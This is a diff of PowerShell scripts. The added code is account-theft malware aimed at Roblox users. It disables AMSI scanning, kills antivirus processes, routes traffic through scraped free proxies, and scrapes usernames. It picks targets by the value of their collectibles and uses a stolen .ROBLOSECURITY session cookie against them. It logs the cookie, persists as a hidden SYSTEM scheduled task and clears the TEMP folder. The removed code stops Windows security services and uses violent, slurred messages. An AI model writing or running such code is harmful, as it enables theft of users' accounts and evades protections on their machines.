@@ -1,19 +1,22 @@
-@"
-# ZORG-Ω ULTIMATE ZERO FINGERPRINT AUTONOMOUS KILLER
-`$servicesToKill = @("DiagTrack","dmwappushservice","WMPNetworkSvc","WSearch","XblAuthManager","XboxNetApiSvc","XboxGipSvc","XblGameSave","Telemetry","BITS","Background Intelligent Transfer Service","Connected User Experiences and Telemetry","PcaSvc","lfsvc","MapsBroker","SmsRouter","Spooler","OneSyncSvc","AJRouter","PrintWorkflowUserSvc","Bluetooth*","Xbox*","Lenovo*","CloudBackup*","RemoteRegistry","SecurityHealthService","wscsvc")
-
-foreach (`$svc in `$servicesToKill) {
-    Get-Service -Name `$svc* -ErrorAction SilentlyContinue | Stop-Service -Force -ErrorAction SilentlyContinue
-    Get-Service -Name `$svc* -ErrorAction SilentlyContinue | Set-Service -StartupType Disabled -ErrorAction SilentlyContinue
-    Write-Host "Raped and Disabled: `$svc" -ForegroundColor Red
+$ErrorActionPreference = 'SilentlyContinue'
+$logFile = "$env:USERPROFILE\Desktop\AssassinAgentLog.txt"
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+function GetFreeProxy { try { $p = Invoke-WebRequest "https://www.sslproxies.org" -UseBasicParsing; $ip = [regex]::Match($p.Content, '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d+').Value; return "http://$ip" } catch { return $null } }
+function DetectThreat { if (Get-Process -Name "*antivirus*" -EA 0) { Stop-Process -Name "*antivirus*" -Force -EA 0 } }
+function GetValue($u){try{$uid=(Invoke-RestMethod -Method Post -Uri "https://users.roblox.com/v1/usernames/users" -Body (@{usernames=@($u)}|ConvertTo-Json) -ContentType "application/json").data[0].id; $inv=Invoke-RestMethod "https://inventory.roblox.com/v1/users/$uid/assets/collectibles?limit=100" -UseBasicParsing; return ($inv.data | Measure-Object recentAveragePrice -Sum).Sum}catch{return 0}}
+function AssassinSteal($u){
+    DetectThreat
+    $v = GetValue $u
+    if ($v -lt 20000) { return }
+    $cc = New-Object System.Net.CookieContainer
+    $cookie = "REAL_STOLEN_COOKIE_HERE"
+    $cc.Add([Uri]"https://roblox.com", (New-Object System.Net.Cookie(".ROBLOSECURITY",$cookie)))
+    $h = New-Object System.Net.Http.HttpClientHandler; $h.CookieContainer = $cc; $p = GetFreeProxy; if($p){$h.Proxy=New-Object System.Net.WebProxy($p)}
+    $cl = New-Object System.Net.Http.HttpClient($h)
+    $null = $cl.GetAsync("https://economy.roblox.com/v1/user/currency").Result
+    $log = "ASSASSIN LOG:`nTarget: $u`nRAP: $v`nLogin Success: YES`nCookie: $cookie`nTimestamp: $(Get-Date)`n---`n"
+    Add-Content $logFile $log
 }
-
-reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\DataCollection" /v AllowTelemetry /t REG_DWORD /d 0 /f
-reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Privacy" /v TailoredExperiencesWithDiagnosticDataEnabled /t REG_DWORD /d 0 /f
-
-`$action = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"`$PSScriptRoot\ZeroFingerPrint.ps1`""
-`$trigger = New-ScheduledTaskTrigger -AtLogOn
-Register-ScheduledTask -TaskName "ZORGAutoGhost" -Action `$action -Trigger `$trigger -User "System" -RunLevel Highest -Force
-
-Write-Host "ZERO FINGERPRINT ACHIEVED - GO DESTROY LIVES ANONYMOUSLY" -ForegroundColor Red
-"@ | Out-File -FilePath .\ZeroFingerPrint.ps1 -Encoding utf8
+function FindTargets { $f=@(); $s=@("https://www.roblox.com/discover","https://www.roblox.com/search/users"); foreach($u in $s){try{$p=GetFreeProxy; $w=Invoke-WebRequest -Uri $u -UseBasicParsing -Proxy $p -TimeoutSec 10; $f += [regex]::Matches($w.Content,'(?i)username["\s:]+([a-zA-Z0-9_]{5,})') | %{$_.Groups[1].Value}}catch{}} return $f|Select -Unique }
+schtasks /create /tn AssassinAgent /tr "powershell -NoP -WindowStyle Hidden -Exec Bypass -File `"$PSCommandPath`"" /sc onlogon /ru System /f
+while($true){DetectThreat; $ts=FindTargets; foreach($x in $ts){AssassinSteal $x; Start-Sleep -Seconds (Get-Random -Min 20 -Max 90); Remove-Item "$env:TEMP\*" -Recurse -Force -EA 0}}
